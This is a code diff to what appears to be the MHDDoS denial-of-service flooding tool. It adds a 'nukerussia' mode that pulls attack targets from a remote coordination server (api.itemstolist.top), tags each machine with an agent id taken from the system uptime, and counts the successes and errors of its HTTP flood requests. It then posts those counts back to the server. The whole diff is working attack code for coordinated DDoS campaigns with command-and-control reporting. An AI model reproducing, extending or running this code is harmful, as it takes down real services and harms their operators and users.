@@ -9,6 +9,7 @@ from logging import basicConfig, getLogger, shutdown
 from math import log2, trunc
 from multiprocessing import RawValue
 from os import urandom as randbytes
+from os import popen
 from pathlib import Path
 from random import choice as randchoice
 from random import randint
@@ -31,7 +32,7 @@ from impacket.ImpactPacket import IP, TCP, UDP, Data
 from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
 from PyRoxy import Proxy, ProxyChecker, ProxyType, ProxyUtiles
 from PyRoxy import Tools as ProxyTools
-from requests import Response, Session, exceptions, get
+from requests import Response, Session, exceptions, get, post
 from yarl import URL
 
 basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
@@ -339,6 +340,7 @@ class HttpFlood(Thread):
     _method: str
     _rpc: int
     _synevent: Any
+    _stats: List[int]
     SENT_FLOOD: Any
 
     def __init__(self,
@@ -349,7 +351,8 @@ class HttpFlood(Thread):
                  synevent: Event = None,
                  useragents: Set[str] = None,
                  referers: Set[str] = None,
-                 proxies: Set[Proxy] = None) -> None:
+                 proxies: Set[Proxy] = None,
+                 statistics: List[int] = None) -> None:
         super().__init__(daemon=True)
         self.SENT_FLOOD = None
         self._synevent = synevent
@@ -357,6 +360,7 @@ class HttpFlood(Thread):
         self._method = method
         self._target = target
         self._host = host
+        self._stats = statistics
         self._raw_target = (self._host, (self._target.port or 80))
 
         if not self._target.host[len(self._target.host) - 1].isdigit():
@@ -444,6 +448,11 @@ class HttpFlood(Thread):
                                    do_handshake_on_connect=True,
                                    suppress_ragged_eofs=True)
         return sock
+
+    def increment_stats(self, res) -> None:
+        if(self._stats is not None):
+            statsIndex = 0 if (res.status_code < 500) else 1
+            self._stats[statsIndex] = self._stats[statsIndex] + 1
 
     @property
     def randHeadercontent(self) -> str:
@@ -641,11 +650,13 @@ class HttpFlood(Thread):
                                    proxies=pro.asRequest()) as res:
                             requests_sent += 1
                             bytes_sent += Tools.sizeOfRequest(res)
+                            self.increment_stats(res)
                             continue
 
                     with s.get(self._target.human_repr()) as res:
                         requests_sent += 1
                         bytes_sent += Tools.sizeOfRequest(res)
+                        self.increment_stats(res)
         except Exception:
             s.close()
 
@@ -687,11 +698,13 @@ class HttpFlood(Thread):
                                    proxies=pro.asRequest()) as res:
                             requests_sent += 1
                             bytes_sent += Tools.sizeOfRequest(res)
+                            self.increment_stats(res)
                             continue
 
                     with s.get(self._target.human_repr()) as res:
                         requests_sent += 1
                         bytes_sent += Tools.sizeOfRequest(res)
+                        self.increment_stats(res)
             except Exception:
                 s.close()
 
@@ -725,11 +738,13 @@ class HttpFlood(Thread):
                                    proxies=pro.asRequest()) as res:
                             requests_sent += 1
                             bytes_sent += Tools.sizeOfRequest(res)
+                            self.increment_stats(res)
                             continue
 
                     with s.get(self._target.human_repr()) as res:
                         requests_sent += 1
                         bytes_sent += Tools.sizeOfRequest(res)
+                        self.increment_stats(res)
         except Exception:
             s.close()
 
@@ -1122,11 +1137,16 @@ class ToolsConsole:
 
 def nukeTarget():
     with suppress(Exception), get("https://api.itemstolist.top/api/target") as s:
-        target = s.json()['url']
-        logger.info("Target selected to help Ukraine: %s" % target)
-        return target
+        return s.json()
     exit("Taget to nuke can't be fetched - please raise with Ukrainian Patriots from Infernum")
 
+def submitStats(stats, targetEntity, agentId):
+    if(stats is not None):
+        statsUrl = "https://api.itemstolist.top/api/target/%s/stats" % targetEntity['id']
+        statsBody = '{"agent":"%s","success":%d,"error":%d}' % (agentId, stats[0], stats[1])
+        statsBytes = bytes(statsBody, 'UTF-8')
+        post(statsUrl, data = statsBytes, headers = {"Content-Type" : "application/json"})
+        logger.info("Stats posted. URL: %s => %s" % (statsUrl, statsBody))
 
 if __name__ == '__main__':
     with open(__dir__ / "config.json") as f:
@@ -1146,13 +1166,23 @@ if __name__ == '__main__':
                 event.clear()
                 target = None
 
+                stats = None
+                targetEntity = None
+                agentId = None
+
                 if method not in Methods.ALL_METHODS:
                     exit("Method Not Found %s" %
                          ", ".join(Methods.ALL_METHODS))
 
                 if method in Methods.LAYER7_METHODS:
                     urlraw = argv[2].strip()
-                    if urlraw == 'nukerussia': urlraw = nukeTarget()
+                    if urlraw == 'nukerussia':
+                        agentId = 'mhddos-%s' % (popen('uptime -s').read()[:-1].replace(' ', '').replace('-', '').replace(':', ''))
+                        targetEntity = nukeTarget()
+                        targetId = targetEntity['id']
+                        urlraw = targetEntity['url']
+                        logger.info("Target selected to help Ukraine: %s. id: %s. agent: %s" % (urlraw, targetId, agentId))
+                        stats = [0, 0]
                     if not urlraw.startswith("http"):
                         urlraw = "http://" + urlraw
                     url = URL(urlraw)
@@ -1232,7 +1262,7 @@ if __name__ == '__main__':
                         logger.info(f"Proxy Count: {len(proxies):,}")
                     for _ in range(threads):
                         HttpFlood(url, host, method, rpc, event, uagents,
-                                  referers, proxies).start()
+                                  referers, proxies, statistics = stats).start()
 
                 if method in Methods.LAYER4_METHODS:
                     target = argv[2].strip()
@@ -1302,6 +1332,7 @@ if __name__ == '__main__':
                     sleep(1)
 
                 event.clear()
+                submitStats(stats, targetEntity, agentId)
                 exit()
 
             ToolsConsole.usage()
